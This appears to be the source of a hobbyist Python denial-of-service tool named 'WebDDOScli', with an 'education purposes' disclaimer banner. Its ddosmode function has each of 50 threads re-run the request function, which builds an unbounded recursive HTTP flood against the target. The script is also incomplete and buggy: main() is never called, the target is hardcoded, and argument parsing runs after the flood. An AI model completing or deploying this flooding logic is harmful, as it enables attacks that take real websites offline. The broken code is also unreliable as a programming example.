import threading
import sys
import requests
from colorama import Fore

print(Fore.GREEN + "╔═════════╣ About ╠══════════╗")
print(Fore.GREEN + "║+-     WebDDOScli V1.0    -+║")
print(Fore.GREEN + "║+- Made Proudly in India, -+║")
print(Fore.GREEN + "║+-    By Prattay Sarkar   -+║")
print(Fore.GREEN + "╚════════════════════════════╝")
print(Fore.RED + "╔═════════════╣ WARNING! ╠═════════════╗")
print(Fore.RED + "║+-   This Application is Created,   -+║")
print(Fore.RED + "║+-      FOR EDUCATION PURPOSES!     -+║")
print(Fore.RED + "║+- Please, Don't MISUSE This Tool!  -+║")
print(Fore.RED + "╚══════════════════════════════════════╝\n")
print(Fore.BLUE + "|+- Trying To Connect To ")


# TODO: Call main() and fix the above line
# TODO: Show Agrv1 and Argv2 in String 16
def main():
    response = requests.get('https://www.example.com')

    # Check if the request was successful (status code 200 indicates success)
    if response.status_code == 200:
        print(Fore.GREEN + "Successfully Connected To URL!")
        print(Fore.BLUE + "Switching Over To DDOS Mode...")
        ddosmode()
    elif response.status_code == 404:
        print(Fore.RED + "URL Doesn't Exist!")
        exit(1)
    else:
        print(Fore.RED + 'Request failed with status code:', response.status_code)


def ddosmode():
    # Create 50 threads and start them
    threads = []
    for _ in range(50):
        thread = threading.Thread(target=main)
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    # Check if arguments are missing
    if len(sys.argv) != 3:
        print(Fore.RED + "Usage: python webddoscli.py <URL in Full (Including https://)> <No. Of Threads>")
        sys.exit(1)

    # Retrieve the arguments
    arg1 = sys.argv[1]
    arg2 = sys.argv[2]

    # Check if any argument is empty
    if not arg1 or not arg2:
        print(Fore.RED + "Error: Both arguments are required.")
        print(Fore.RED + "Usage: python webddoscli.py <URL in Full (Including https://)> <No. Of Threads>")
        sys.exit(1)

    # Use the arguments
    print("Argument 1:", arg1)
    print("Argument 2:", arg2)
